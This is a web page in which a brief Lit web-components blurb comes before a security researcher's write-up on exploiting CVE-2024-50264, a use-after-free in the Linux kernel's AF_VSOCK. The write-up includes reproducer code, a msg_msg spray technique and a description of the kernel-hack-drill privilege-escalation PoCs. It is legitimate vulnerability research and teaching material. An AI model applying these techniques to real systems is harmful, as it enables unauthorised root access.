  &lt;main&gt;&lt;p&gt;Simple. Fast. Web Components.&lt;/p&gt;&lt;head rend="h1"&gt;Simple&lt;/head&gt;&lt;p&gt;Skip the boilerplate&lt;/p&gt;&lt;p&gt;Building on top of the Web Components standards, Lit adds just what you need to be happy and productive: reactivity, declarative templates and a handful of thoughtful features to reduce boilerplate and make your job easier. Every Lit feature is carefully designed with web platform evolution in mind.&lt;/p&gt;&lt;head rend="h1"&gt;Fast&lt;/head&gt;&lt;p&gt;Tiny footprint, instant updates&lt;/p&gt;&lt;p&gt;Weighing in at around 5 KB (minified and compressed), Lit helps keep your bundle size small and your loading time short. And rendering is blazing fast, because Lit touches only the dynamic parts of your UI when updating — no need to rebuild a virtual tree and diff it with the DOM.&lt;/p&gt;&lt;head rend="h1"&gt;Web Components&lt;/head&gt;&lt;p&gt;Interoperable &amp;amp; future-ready&lt;/p&gt;&lt;p&gt;Every Lit component is a native web component, with the superpower of interoperability. Web components work anywhere you use HTML, with any framework or none at all. This makes Lit ideal for building shareable components, design systems, or maintainable, future-ready sites and apps.&lt;/p&gt;&lt;head rend="h1"&gt;Custom Elements&lt;/head&gt;&lt;p&gt;Lit components are standard custom elements, so the browser treats them exactly like built-in elements. Use them in hand-written HTML or framework code, output them from your CMS or static site builder, even create instances in JavaScript — they just work!&lt;/p&gt;&lt;head rend="h1"&gt;Scoped styles&lt;/head&gt;&lt;p&gt;Lit scopes your styles by default, using Shadow DOM. This keeps your CSS selectors simple and ensures that your component’s styles don't affect — and aren't affected by — any other styles on the page.&lt;/p&gt;&lt;head rend="h1"&gt;Reactive properties&lt;/head&gt;&lt;p&gt;Declare reactive properties to model your component’s API and internal state. A Lit component efficiently re-renders whenever a reactive property (or corresponding HTML attribute) changes.&lt;/p&gt;&lt;head rend="h1"&gt;Declarative templates&lt;/head&gt;&lt;p&gt;Lit templates, based on tagged template literals, are simple, expressive and fast, featuring HTML markup with native JavaScript expressions inline. No custom syntax to learn, no compilation required.&lt;/p&gt;&lt;head rend="h1"&gt;Build anything with Lit&lt;/head&gt;&lt;head rend="h2"&gt;Shareable Components&lt;/head&gt;&lt;p&gt;Need to deliver interactive content or features that drop into any site, built on any stack? Because they're natively supported by browsers, web components are the perfect solution — and Lit makes them easy to build.&lt;/p&gt;&lt;head rend="h2"&gt;Design Systems&lt;/head&gt;&lt;p&gt;A design system helps you create experiences that are consistently excellent and on brand. But what if your organization uses multiple frameworks? With Lit, you can build one set of components that works for every team.&lt;/p&gt;&lt;head rend="h2"&gt;Sites and Apps&lt;/head&gt;&lt;p&gt;Use Lit components to progressively enhance a static site, or build an entire app. By embracing Web Components, Lit minimizes lock-in and promotes maintainability: update or migrate one component at a time, without disrupting product development.&lt;/p&gt;&lt;head rend="h1"&gt;Many of the world's most forward-looking organizations are building with Lit&lt;/head&gt;&lt;head rend="h1"&gt;Explore Lit&lt;/head&gt;&lt;head rend="h2"&gt;Try our live tutorials — no installation needed&lt;/head&gt;Tutorials&lt;head rend="h2"&gt;Tinker with our interactive examples&lt;/head&gt;Playground&lt;head rend="h2"&gt;Dive deep with our extensive docs&lt;/head&gt;Documentation&lt;head rend="h2"&gt;Check out all the options for jumping in&lt;/head&gt;Get started&lt;head rend="h1"&gt;Connect with Lit and the web components community&lt;/head&gt;&lt;p&gt;Stay up to date with new releases, learn more about how to use web components and share projects and feedback with our team.

    &lt;head rend="h1"&gt;Kernel-hack-drill and a new approach to exploiting CVE-2024-50264 in the Linux kernel&lt;/head&gt;
    &lt;p&gt;Some memory corruption bugs are much harder to exploit than others. They can involve race conditions, crash the system, and impose limitations that make a researcher's life difficult. Working with such fragile vulnerabilities demands significant time and effort. CVE-2024-50264 in the Linux kernel is one such hard bug, which received the Pwnie Award 2025 as the Best Privilege Escalation. In this article, I introduce my personal project kernel-hack-drill and show how it helped me to exploit CVE-2024-50264.&lt;/p&gt;
    &lt;head rend="h2"&gt;Bug collision story&lt;/head&gt;
    &lt;p&gt;I first found a bug in &lt;code&gt;AF_VSOCK&lt;/code&gt; back in 2021 and published the article Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel. In April 2024, I was fuzzing this kernel subsystem with a customized syzkaller and found another crash in &lt;code&gt;AF_VSOCK&lt;/code&gt;. I minimized the crash reproducer and disabled KASAN. This resulted in an immediate null-ptr-deref in a kernel worker (&lt;code&gt;kworker&lt;/code&gt;). Convinced the path forward would be painful, I shelved the bug. This was a wrong decision.&lt;/p&gt;
    &lt;p&gt;Later, in autumn 2024, I decided to look at this bug again and got promising results. Then, one calm evening, I realized I'd collided with Hyunwoo Kim (@v4bel) and Wongi Lee (@qwerty): they'd already disclosed the bug as CVE-2024-50264 and used it at kernelCTF. Their patch turned my PoC exploit into a null-ptr-deref:&lt;/p&gt;
    &lt;p&gt;Anyone who has dealt with a bug collision can imagine what I felt. I was wondering whether to keep digging into this vulnerability or just give it up.&lt;/p&gt;
    &lt;p&gt;Viktor Vasnetsov: Vityaz at the Crossroads (1882)&lt;/p&gt;
    &lt;p&gt;The exploit strategy by @v4bel and @qwerty looked very complicated. I had other ideas, so I decided to continue my research. I chose Ubuntu Server 24.04 with a fresh OEM/HWE kernel (v6.11) as the target for my PoC exploit.&lt;/p&gt;
    &lt;head rend="h2"&gt;CVE-2024-50264 analysis&lt;/head&gt;
    &lt;p&gt;The vulnerability CVE-2024-50264 was introduced in August 2016 by commit 06a8fc78367d in Linux v4.8. It is a race condition in &lt;code&gt;AF_VSOCK&lt;/code&gt; sockets that happens between the &lt;code&gt;connect()&lt;/code&gt; system call and a POSIX signals, resulting in a use-after-free (UAF). An unprivileged user can trigger this bug without user namespaces, which makes it more dangerous.&lt;/p&gt;
    &lt;p&gt;The kernel uses a freed &lt;code&gt;virtio_vsock_sock&lt;/code&gt; object. Its size is 80 bytes, which is suitable for the &lt;code&gt;kmalloc-96&lt;/code&gt; slab cache. The memory corruption is a UAF write executed by a kernel worker.&lt;/p&gt;
    &lt;p&gt;However, this vulnerability also brings a bunch of nasty limitations for exploitation. I can say that it's the worst bug to exploit I've ever seen. The Pwnie Award is well-deserved. I'll outline those constraints shortly.&lt;/p&gt;
    &lt;head rend="h2"&gt;Reproducing the bug using an "immortal signal"&lt;/head&gt;
    &lt;p&gt;First, an attacker should create a listening virtual socket (server vsock):&lt;/p&gt;
    &lt;code&gt;int ret = -1;
int vsock1 = 0;

vsock1 = socket(AF_VSOCK, SOCK_STREAM, 0);
if (vsock1 &amp;lt; 0)
	err_exit("[-] creating vsock");

ret = bind(vsock1, (struct sockaddr *)&amp;amp;addr, sizeof(struct sockaddr_vm));
if (ret != 0)
	err_exit("[-] binding vsock");

ret = listen(vsock1, 0); /* backlog = 0 */
if (ret != 0)
	err_exit("[-] listening vsock");
&lt;/code&gt;
    &lt;p&gt;Then the attacker should try to open a connection from a client vsock:&lt;/p&gt;
    &lt;code&gt;#define UAF_PORT 0x2712

int vsock2 = 0;
struct sockaddr_vm addr = {
	.svm_family = AF_VSOCK,
	.svm_port = UAF_PORT,
	.svm_cid = VMADDR_CID_LOCAL
};

vsock2 = socket(AF_VSOCK, SOCK_STREAM, 0);
if (vsock2 &amp;lt; 0)
	err_exit("[-] creating vsock");

ret = connect(vsock2, (struct sockaddr *)&amp;amp;addr, sizeof(struct sockaddr_vm));
&lt;/code&gt;
    &lt;p&gt;To trigger the bug, the attacker should interrupt this &lt;code&gt;connect()&lt;/code&gt; system call with a POSIX signal. @v4bel &amp;amp; @qwerty used &lt;code&gt;SIGKILL&lt;/code&gt;, but that kills the exploit process. My fuzzer stumbled on a cleaner trick that surprised me:&lt;/p&gt;
    &lt;code&gt;struct sigevent sev = {};
timer_t race_timer = 0;

sev.sigev_notify = SIGEV_SIGNAL;
sev.sigev_signo = 33;
ret = timer_create(CLOCK_MONOTONIC, &amp;amp;sev, &amp;amp;race_timer);
&lt;/code&gt;
    &lt;p&gt;My fuzzer discovered that a timer can fire signal 33 and interrupt &lt;code&gt;connect()&lt;/code&gt;. Signal 33 is special. The Native POSIX Threads Library (NPTL) keeps it for internal work and the operating system quietly shields applications from it. As &lt;code&gt;man 7 nptl&lt;/code&gt; explains:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;NPTL makes internal use of the first two real-time signals (signal numbers 32 and 33). One of these signals is used to support thread cancellation and POSIX timers (see&lt;/p&gt;&lt;code&gt;timer_create(2)&lt;/code&gt;); the other is used as part of a mechanism that ensures all threads in a process always have the same UIDs and GIDs, as required by POSIX. These signals cannot be used in applications.&lt;/quote&gt;
    &lt;p&gt;True, these signals cannot be used in applications, but they are perfect for my exploit 😉&lt;/p&gt;
    &lt;p&gt;I use &lt;code&gt;timer_settime()&lt;/code&gt; for &lt;code&gt;race_timer&lt;/code&gt;, which lets me choose the exact moment signal 33 interrupts &lt;code&gt;connect()&lt;/code&gt;. Moreover, the signal is invisible to the exploit process and doesn't kill it.&lt;/p&gt;
    &lt;head rend="h2"&gt;About memory corruption&lt;/head&gt;
    &lt;p&gt;The race condition succeeds when a signal interrupts the &lt;code&gt;connect()&lt;/code&gt; system call while the vulnerable socket is in the &lt;code&gt;TCP_ESTABLISHED&lt;/code&gt; state. The socket then drops into the &lt;code&gt;TCP_CLOSING&lt;/code&gt; state:&lt;/p&gt;
    &lt;code&gt;if (signal_pending(current)) {
	err = sock_intr_errno(timeout);
	sk-&amp;gt;sk_state = sk-&amp;gt;sk_state == TCP_ESTABLISHED ? TCP_CLOSING : TCP_CLOSE;
	sock-&amp;gt;state = SS_UNCONNECTED;
	vsock_transport_cancel_pkt(vsk);
	vsock_remove_connected(vsk);
	goto out_wait;
}
&lt;/code&gt;
    &lt;p&gt;The second attempt to connect the vulnerable vsock to the server vsock using a different &lt;code&gt;svm_cid&lt;/code&gt; (&lt;code&gt;VMADDR_CID_HYPERVISOR&lt;/code&gt;) provokes memory corruption.&lt;/p&gt;
    &lt;code&gt;struct sockaddr_vm addr = {
	.svm_family = AF_VSOCK,
	.svm_port = UAF_PORT,
	.svm_cid = VMADDR_CID_HYPERVISOR
};

/* this connect will schedule the kernel worker performing UAF */
ret = connect(vsock2, (struct sockaddr *)&amp;amp;addr, sizeof(struct sockaddr_vm));
&lt;/code&gt;
    &lt;p&gt;Under the hood, the &lt;code&gt;connect()&lt;/code&gt; system call executes &lt;code&gt;vsock_assign_transport()&lt;/code&gt;. This function switches the virtual socket to the new &lt;code&gt;svm_cid&lt;/code&gt; transport and frees the resources tied to the previous vsock transport:&lt;/p&gt;
    &lt;code&gt;if (vsk-&amp;gt;transport) {
	if (vsk-&amp;gt;transport == new_transport)
		return 0;

	/* transport-&amp;gt;release() must be called with sock lock acquired.
	 * This path can only be taken during vsock_connect(), where we
	 * have already held the sock lock. In the other cases, this
	 * function is called on a new socket which is not assigned to
	 * any transport.
	 */
	vsk-&amp;gt;transport-&amp;gt;release(vsk);
	vsock_deassign_transport(vsk);
}
&lt;/code&gt;
    &lt;p&gt;This procedure closes the old vsock transport in &lt;code&gt;virtio_transport_close()&lt;/code&gt; and frees the &lt;code&gt;virtio_vsock_sock&lt;/code&gt; object in &lt;code&gt;virtio_transport_destruct()&lt;/code&gt;. However, due to the erroneous &lt;code&gt;TCP_CLOSING&lt;/code&gt; state of the socket, &lt;code&gt;virtio_transport_close()&lt;/code&gt; initiates further communication. To handle that activity, the kernel schedules a &lt;code&gt;kworker&lt;/code&gt; that eventually calls &lt;code&gt;virtio_transport_space_update()&lt;/code&gt;, which operates on the freed structure:&lt;/p&gt;
    &lt;code&gt;static bool virtio_transport_space_update(struct sock *sk, struct sk_buff *skb)
{
	struct virtio_vsock_hdr *hdr = virtio_vsock_hdr(skb);
	struct vsock_sock *vsk = vsock_sk(sk);
	struct virtio_vsock_sock *vvs = vsk-&amp;gt;trans; /* ptr to freed object */
	bool space_available;

	if (!vvs)
		return true;

	spin_lock_bh(&amp;amp;vvs-&amp;gt;tx_lock); /* proceed if 4 bytes are zero (UAF write non-zero to lock) */
	vvs-&amp;gt;peer_buf_alloc = le32_to_cpu(hdr-&amp;gt;buf_alloc); /* UAF write 4 bytes */
	vvs-&amp;gt;peer_fwd_cnt = le32_to_cpu(hdr-&amp;gt;fwd_cnt); /* UAF write 4 bytes */
	space_available = virtio_transport_has_space(vsk); /* UAF read, not interesting */
	spin_unlock_bh(&amp;amp;vvs-&amp;gt;tx_lock); /* UAF write, restore 4 zero bytes */
	return space_available;
}
&lt;/code&gt;
    &lt;p&gt;The following diagram shows the layout of the UAF in the vulnerable object:&lt;/p&gt;
    &lt;p&gt;Here in yellow I show the &lt;code&gt;tx_lock&lt;/code&gt; field that must be zero. Otherwise, the kernel hangs while trying to acquire the spinlock. In red I show the &lt;code&gt;peer_buf_alloc&lt;/code&gt; and &lt;code&gt;peer_fwd_cnt&lt;/code&gt; fields that are overwritten after the object is freed. There is no pointer dereference in the freed object.&lt;/p&gt;
    &lt;p&gt;The value written to &lt;code&gt;virtio_vsock_sock.peer_buf_alloc&lt;/code&gt; can be controlled from the userspace:&lt;/p&gt;
    &lt;code&gt;/* Increase the range for the value that we want to write during UAF: */
uaf_val_limit = 0x1lu; /* can't be zero */
setsockopt(vsock1, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
           &amp;amp;uaf_val_limit, sizeof(uaf_val_limit));
uaf_val_limit = 0xfffffffflu;
setsockopt(vsock1, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
           &amp;amp;uaf_val_limit, sizeof(uaf_val_limit));

/* Set the 4-byte value that we want to write during UAF: */
setsockopt(vsock1, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
           &amp;amp;uaf_val, sizeof(uaf_val));
&lt;/code&gt;
    &lt;p&gt;The field &lt;code&gt;virtio_vsock_sock.peer_fwd_cnt&lt;/code&gt; tracks how many bytes have been pushed through vsock using &lt;code&gt;sendmsg()&lt;/code&gt;/&lt;code&gt;recvmsg()&lt;/code&gt;. It is zero by default (four zero bytes).&lt;/p&gt;
    &lt;head rend="h2"&gt;Not so fast. CVE-2024-50264 has limitations&lt;/head&gt;
    &lt;p&gt;As I mentioned earlier, this vulnerability has a lot of nasty limitations for the exploitation:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt;client object is allocated together with the server object from the same slab cache. That disturbs cross-cache attacks.&lt;/item&gt;
      &lt;item&gt;Reproducing this race condition is very unstable.&lt;/item&gt;
      &lt;item&gt;The UAF write occurs in a kworker a few microseconds after &lt;code&gt;kfree()&lt;/code&gt;, too quickly for typical cross-cache attacks.&lt;/item&gt;
      &lt;item&gt;A null-ptr-deref in the kworker follows the UAF write. That's why I shelved the bug at first.&lt;/item&gt;
      &lt;item&gt;Even if that kernel oops is avoided, another null-ptr-deref occurs in the kworker after &lt;code&gt;VSOCK_CLOSE_TIMEOUT&lt;/code&gt;(eight seconds).&lt;/item&gt;
      &lt;item&gt;The kworker hangs in &lt;code&gt;spin_lock_bh()&lt;/code&gt;if&lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt;is not zero, as noted above.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I uncovered each obstacle one by one while developing the PoC exploit for CVE-2024-50264. It remains the worst bug to exploit I've ever seen. I guess that's why it received the Pwnie Award 2025 as the Best Privilege Escalation.&lt;/p&gt;
    &lt;head rend="h2"&gt;First thoughts on exploit strategy&lt;/head&gt;
    &lt;p&gt;The exploit strategy by @v4bel and @qwerty was complex:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;A large-scale BPF JIT spray that filled a significant portion of physical memory&lt;/item&gt;
      &lt;item&gt;The SLUBStick technique from Graz University of Technology, which allowed to: &lt;list rend="ul"&gt;&lt;item&gt;Determine the number of objects in the active slab using a timing side channel&lt;/item&gt;&lt;item&gt;Then, place the client and server &lt;code&gt;virtio_vsock_sock&lt;/code&gt;objects in different slabs, landing one at the end of its slab and the other at the start of the next slab&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;The Dirty Pagetable technique, which allowed to use the UAF object for overwriting a page table entry (PTE)&lt;/item&gt;
      &lt;item&gt;Modifying a PTE to make it possibly point to a BPF JIT region&lt;/item&gt;
      &lt;item&gt;Inserting a privilege-escalation payload into the BPF code&lt;/item&gt;
      &lt;item&gt;Communicating via a socket to execute the privilege-escalation payload.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I felt I could make the PoC exploit for CVE-2024-50264 much simpler. My first thought was to steer the UAF write into some victim object and build a useful exploit primitive around it.&lt;/p&gt;
    &lt;p&gt;I decided not to search victim objects inside the &lt;code&gt;kmalloc-96&lt;/code&gt; slab cache. Ubuntu Server 24.04 ships with &lt;code&gt;kconfig&lt;/code&gt; options that neutralize naive heap spraying for UAF exploitation:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;CONFIG_SLAB_BUCKETS=y&lt;/code&gt;, which creates a set of separate slab caches for allocations with user-controlled data&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;CONFIG_RANDOM_KMALLOC_CACHES=y&lt;/code&gt;. Here's a quote from the kernel documentation about it:&lt;p&gt;It is a hardening feature that creates multiple copies of slab caches for normal kmalloc allocation and makes kmalloc randomly pick one based on code address, which makes the attackers more difficult to spray vulnerable memory objects on the heap for the purpose of exploiting memory vulnerabilities.&lt;/p&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;That's why I decided to perform the cross-cache attack anyway.&lt;/p&gt;
    &lt;p&gt;The first victim object I decided to try was &lt;code&gt;struct cred&lt;/code&gt;. Its size is 184 bytes, and the kernel allocates these objects in slabs of size 192 bytes. That would allow only two possible offsets of the UAF in the victim &lt;code&gt;cred&lt;/code&gt;, because slabs for the vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt; have size 96 bytes (half of 192). The diagram below shows how two vulnerable &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects overlap the &lt;code&gt;cred&lt;/code&gt; object. The memory corruption may happen on one of the &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects.&lt;/p&gt;
    &lt;p&gt;Unfortunately, &lt;code&gt;struct cred&lt;/code&gt; reallocated at the place of the freed &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects doesn't provide anything useful for the attacker:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;If the UAF happened on the first &lt;code&gt;virtio_vsock_sock&lt;/code&gt;, the kernel would hang in&lt;code&gt;spin_lock_bh()&lt;/code&gt;, because&lt;code&gt;cred&lt;/code&gt;has a non-null&lt;code&gt;uid&lt;/code&gt;value at the place of&lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;If the UAF happened on the second &lt;code&gt;virtio_vsock_sock&lt;/code&gt;, writing controlled data to&lt;code&gt;virtio_vsock_sock.peer_buf_alloc&lt;/code&gt;would corrupt the&lt;code&gt;cred.request_key_auth&lt;/code&gt;pointer. I had no idea how to use it without a prior infoleak.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The &lt;code&gt;cred&lt;/code&gt; object didn't work for me, so I started to search for the next candidate. My next victim object for the memory corruption was &lt;code&gt;msg_msg&lt;/code&gt;. I like this object: I first used it for heap spraying in 2021 (you can find the details in the article "Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel").&lt;/p&gt;
    &lt;p&gt;It was a novel approach back then. This time, I set out to create something new again.&lt;/p&gt;
    &lt;p&gt;I chose a 96-byte &lt;code&gt;msg_msg&lt;/code&gt; because the slab allocator would use slabs of the same size for this &lt;code&gt;msg_msg&lt;/code&gt; and &lt;code&gt;virtio_vsock_sock&lt;/code&gt;. That would allow the UAF write to land at a fixed offset in the victim &lt;code&gt;msg_msg&lt;/code&gt; object. The following diagram shows what happens with the &lt;code&gt;msg_msg&lt;/code&gt; object allocated at the place of the freed &lt;code&gt;virtio_vsock_sock&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;msg_msg.m_list.prev&lt;/code&gt; is the kernelspace pointer to the previous object in the linked list. This pointer is zero when &lt;code&gt;msg_msg&lt;/code&gt; is created (see &lt;code&gt;CONFIG_INIT_ON_ALLOC_DEFAULT_ON&lt;/code&gt;) and then it is initialized with a non-null value when &lt;code&gt;msg_msg&lt;/code&gt; is inserted into the message queue. Unfortunately, this non-null pointer is interpreted as &lt;code&gt;virtio_vsock_sock.tx_lock&lt;/code&gt;. That makes the &lt;code&gt;virtio_transport_space_update()&lt;/code&gt; function hang while executing &lt;code&gt;spin_lock_bh()&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;To bypass this restriction, I needed the kernel to initialize &lt;code&gt;msg_msg.m_list.prev&lt;/code&gt; after the UAF write. I looked for a way to postpone placing &lt;code&gt;msg_msg&lt;/code&gt; in the message queue and eventually found the solution.&lt;/p&gt;
    &lt;head rend="h2"&gt;msg_msg spray allowing m_list field corruption (novel technique)&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;I filled the message queue almost completely before sending the target &lt;code&gt;msg_msg&lt;/code&gt;.&lt;list rend="ul"&gt;&lt;item&gt;The message queue size is &lt;code&gt;MSGMNB=16384&lt;/code&gt;bytes.&lt;/item&gt;&lt;item&gt;I sent 2 clogging messages of 8191 bytes each without calling the &lt;code&gt;msgrcv()&lt;/code&gt;syscall.&lt;/item&gt;&lt;item&gt;Only 2 bytes were left in the queue.&lt;/item&gt;&lt;item&gt;I used &lt;code&gt;mtype = 1&lt;/code&gt;for these messages.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;The message queue size is &lt;/item&gt;
      &lt;item&gt;Then I performed spraying by calling &lt;code&gt;msgsnd()&lt;/code&gt;for the target&lt;code&gt;msg_msg&lt;/code&gt;objects.&lt;list rend="ul"&gt;&lt;item&gt;I called the &lt;code&gt;msgsnd()&lt;/code&gt;syscall in separate pthreads and used&lt;code&gt;mtype = 2&lt;/code&gt;for these messages to distinguish them from the clogging messages.&lt;/item&gt;&lt;item&gt;The kernel allocates target &lt;code&gt;msg_msg&lt;/code&gt;and then blocks&lt;code&gt;msgsnd()&lt;/code&gt;in&lt;code&gt;ipc/msg.c&lt;/code&gt;while it waits for space in the message queue:&lt;/item&gt;&lt;/list&gt;&lt;code&gt;if (msg_fits_inqueue(msq, msgsz)) break; /* queue full, wait: */ if (msgflg &amp;amp; IPC_NOWAIT) { err = -EAGAIN; goto out_unlock0; } /* enqueue the sender and prepare to block */ ss_add(msq, &amp;amp;s, msgsz); if (!ipc_rcu_getref(&amp;amp;msq-&amp;gt;q_perm)) { err = -EIDRM; goto out_unlock0; } ipc_unlock_object(&amp;amp;msq-&amp;gt;q_perm); rcu_read_unlock(); schedule();&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;I called the &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;While the&lt;/p&gt;&lt;code&gt;msgsnd()&lt;/code&gt;syscalls were waiting for space in the message queue, I performed the UAF write corrupting the&lt;code&gt;m_list&lt;/code&gt;,&lt;code&gt;m_type&lt;/code&gt;, and&lt;code&gt;m_ts&lt;/code&gt;fields of one of the target&lt;code&gt;msg_msg&lt;/code&gt;objects.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;After the UAF write, I called&lt;/p&gt;&lt;code&gt;msgrcv()&lt;/code&gt;for type 1 clogging messages.&lt;/item&gt;
      &lt;item&gt;Then the blocked &lt;code&gt;msgsnd()&lt;/code&gt;syscall woke up to add the sprayed&lt;code&gt;msg_msg&lt;/code&gt;to the queue and the kernel fixed the corrupted&lt;code&gt;m_list&lt;/code&gt;field:&lt;code&gt;if (!pipelined_send(msq, msg, &amp;amp;wake_q)) { /* no one is waiting for this message, enqueue it */ list_add_tail(&amp;amp;msg-&amp;gt;m_list, &amp;amp;msq-&amp;gt;q_messages); msq-&amp;gt;q_cbytes += msgsz; msq-&amp;gt;q_qnum++; percpu_counter_add_local(&amp;amp;ns-&amp;gt;percpu_msg_bytes, msgsz); percpu_counter_add_local(&amp;amp;ns-&amp;gt;percpu_msg_hdrs, 1); }&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Cool! This technique is also useful for blind overwriting of &lt;code&gt;msg_msg&lt;/code&gt; using the out-of-bounds write. No kernel infoleak is needed. The kernel restores the corrupted &lt;code&gt;m_list&lt;/code&gt; pointers. In my particular case, this approach allowed me to avoid &lt;code&gt;virtio_transport_space_update()&lt;/code&gt; hanging in &lt;code&gt;spin_lock_bh()&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;To implement the UAF write into an &lt;code&gt;msg_msg&lt;/code&gt; object, I needed to perform cross-cache attack turning &lt;code&gt;virtio_vsock_sock&lt;/code&gt; into &lt;code&gt;msg_msg&lt;/code&gt;. On Ubuntu Server 24.04, the &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects live in one of 16 &lt;code&gt;kmalloc-rnd-?-96&lt;/code&gt; slab caches enabled by &lt;code&gt;CONFIG_RANDOM_KMALLOC_CACHES&lt;/code&gt;. The &lt;code&gt;msg_msg&lt;/code&gt; objects live in a dedicated &lt;code&gt;msg_msg-96&lt;/code&gt; slab cache enabled by &lt;code&gt;CONFIG_SLAB_BUCKETS&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;To implement the cross-cache attack, I needed to learn how these attacks work on the latest Ubuntu kernel, but testing exploit primitives together with this crazy race condition was really painful. Then, I got an idea:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;If an unstable race condition creates problems, let's use a testing ground for developing the exploit primitives!&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h2"&gt;Kernel Hack Drill&lt;/head&gt;
    &lt;p&gt;Back in 2017, I created a pet project for my students called kernel-hack-drill. It provides a test environment for learning and experimenting with Linux kernel exploits. I remembered it and decided to use &lt;code&gt;kernel-hack-drill&lt;/code&gt; to develop the exploit primitives for CVE-2024-50264.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;kernel-hack-drill&lt;/code&gt; is an open-source project published under the &lt;code&gt;GPL-3.0&lt;/code&gt; license. It contains the following parts:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;drill_mod.c&lt;/code&gt;is a small Linux kernel module that provides the&lt;code&gt;/proc/drill_act&lt;/code&gt;file as a simple interface to userspace. This module contains vulnerabilities that you can control and experiment with.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill.h&lt;/code&gt;is a header file describing the&lt;code&gt;drill_mod.ko&lt;/code&gt;interface:&lt;code&gt;enum drill_act_t { DRILL_ACT_NONE = 0, DRILL_ACT_ALLOC = 1, DRILL_ACT_CALLBACK = 2, DRILL_ACT_SAVE_VAL = 3, DRILL_ACT_FREE = 4, DRILL_ACT_RESET = 5 }; #define DRILL_ITEM_SIZE 95 struct drill_item_t { unsigned long foobar; void (*callback)(void); char data[]; /* C99 flexible array */ }; #define DRILL_N 10240&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_test.c&lt;/code&gt;is a userspace test for&lt;code&gt;drill_mod.ko&lt;/code&gt;that provides the examples of using&lt;code&gt;/proc/drill_act&lt;/code&gt;. This test doesn't provoke memory corruptions in&lt;code&gt;drill_mod.ko&lt;/code&gt;and it passes if&lt;code&gt;CONFIG_KASAN=y&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;README.md&lt;/code&gt;includes a detailed step-by-step setup guide on how to use&lt;code&gt;kernel-hack-drill&lt;/code&gt;(kudos to the contributors!).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Fun fact: when I chose the name &lt;code&gt;kernel-hack-drill&lt;/code&gt; for this project, I used the word &lt;code&gt;drill&lt;/code&gt; to mean &lt;code&gt;training&lt;/code&gt; or &lt;code&gt;workout&lt;/code&gt; for Linux kernel security. My friends and students read it differently. They thought I meant something like this:&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;kernel-hack-drill&lt;/code&gt; project is a bit similar to KRWX, but much simpler. Moreover, it ships with ready-made PoC exploits:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_callback.c&lt;/code&gt;: a UAF exploit that invokes a callback inside a freed&lt;code&gt;drill_item_t&lt;/code&gt;structure. It hijacks control flow and gains LPE.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_w_msg_msg.c&lt;/code&gt;: a UAF exploit that writes into a freed&lt;code&gt;drill_item_t&lt;/code&gt;. It uses a cross-cache attack and overwrites&lt;code&gt;msg_msg.m_ts&lt;/code&gt;enabling out-of-bounds reading of the kernel memory. I wrote this PoC while working on the bug described in this article.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_w_pipe_buffer.c&lt;/code&gt;: a UAF exploit that writes into a freed&lt;code&gt;drill_item_t&lt;/code&gt;. It performs a cross-cache attack and overwrites&lt;code&gt;pipe_buffer.flags&lt;/code&gt;to implement the Dirty Pipe technique and gain LPE. This PoC exploit was also developed during my experiments with CVE-2024-50264.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Recent contributions added new variants (kudos to the contributors!):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;drill_uaf_callback_rop_smep.c&lt;/code&gt;: an improved version of&lt;code&gt;drill_uaf_callback.c&lt;/code&gt;that adds a ROP chain to bypass SMEP on&lt;code&gt;x86_64&lt;/code&gt;.&lt;/item&gt;
